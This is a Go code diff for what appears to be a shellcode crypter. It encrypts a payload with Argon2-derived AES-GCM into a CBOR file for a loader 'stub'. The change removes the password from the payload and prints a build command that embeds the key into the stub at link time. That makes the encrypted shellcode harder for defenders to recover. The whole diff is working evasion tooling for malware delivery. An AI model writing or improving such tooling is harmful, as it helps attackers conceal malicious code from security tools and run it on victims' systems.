@@ -6,6 +6,7 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
+	"encoding/hex"
 	"flag"
 	"fmt"
 	"io"
@@ -16,22 +17,22 @@ import (
 
 	"github.com/fxamacker/cbor/v2"
 	"golang.org/x/crypto/argon2"
-	"golang.org/x/crypto/chacha20poly1305"
-	"golang.org/x/crypto/twofish"
 )
 
 const (
 	argonTime    uint32 = 1
 	argonMemory  uint32 = 64 * 1024
 	argonThreads uint8  = 4
-	argonKeyLen  uint32 = chacha20poly1305.KeySize
+	argonKeyLen  uint32 = 32
 	saltSize            = 16
 	passwordSize        = 32
 )
 
+// password is NOT stored in the CBOR payload
+// It is printed to stdout after encryption and must be injected into the stub
+// at link time via: -ldflags "-X main.password=<hex>"
 type PayloadData struct {
 	EncryptedBytes []byte `cbor:"encrypted"`
-	Password       []byte `cbor:"password"`
 	Salt           []byte `cbor:"salt"`
 	Nonce          []byte `cbor:"nonce"`
 	Alg            string `cbor:"alg"`
@@ -45,7 +46,6 @@ type PayloadData struct {
 }
 
 func main() {
-	algFlag := flag.String("alg", "chacha20", "encryption algorithm: chacha20, aesgcm, twofish")
 	typeFlag := flag.String("type", "shellcode", "type of file, you don't need to set this")
 	flag.Parse()
 
@@ -76,33 +76,14 @@ func main() {
 
 	key := argon2.IDKey(password, salt, argonTime, argonMemory, argonThreads, argonKeyLen)
 
-	var aead cipher.AEAD
-	alg := strings.ToLower(*algFlag)
-	switch alg {
-	case "aesgcm", "aes":
-		block, err := aes.NewCipher(key)
-		if err != nil {
-			log.Fatalf("[-] failed to create AES cipher: %v", err)
-		}
-		aead, err = cipher.NewGCM(block)
-		if err != nil {
-			log.Fatalf("[-] failed to create AES-GCM AEAD: %v", err)
-		}
-	case "twofish":
-		block, err := twofish.NewCipher(key)
-		if err != nil {
-			log.Fatalf("[-] failed to create Twofish cipher: %v", err)
-		}
-		aead, err = cipher.NewGCM(block)
-		if err != nil {
-			log.Fatalf("[-] failed to create Twofish-GCM AEAD: %v", err)
-		}
-	default:
-		aead, err = chacha20poly1305.New(key)
-		if err != nil {
-			log.Fatalf("[-] failed to create AEAD: %v", err)
-		}
-		alg = "chacha20"
+	alg := "aesgcm"
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		log.Fatalf("[-] failed to create AES cipher: %v", err)
+	}
+	aead, err := cipher.NewGCM(block)
+	if err != nil {
+		log.Fatalf("[-] failed to create AES-GCM AEAD: %v", err)
 	}
 
 	nonce := make([]byte, aead.NonceSize())
@@ -153,7 +134,6 @@ func main() {
 	}
 	payload := PayloadData{
 		EncryptedBytes: encryptedBytes,
-		Password:       password,
 		Salt:           salt,
 		Nonce:          nonce,
 		Alg:            alg,
@@ -181,5 +161,7 @@ func main() {
 		log.Fatalf("[-] failed to write CBOR payload: %v", err)
 	}
 
+	hexPassword := hex.EncodeToString(password)
 	fmt.Printf("[+] encryption completed successfully!\nCBOR payload saved to:\n- %s\n", payloadPath)
+	fmt.Printf("[+] build stub with:\n    go build -ldflags \"-X main.password=%s\" .\n", hexPassword)
 }
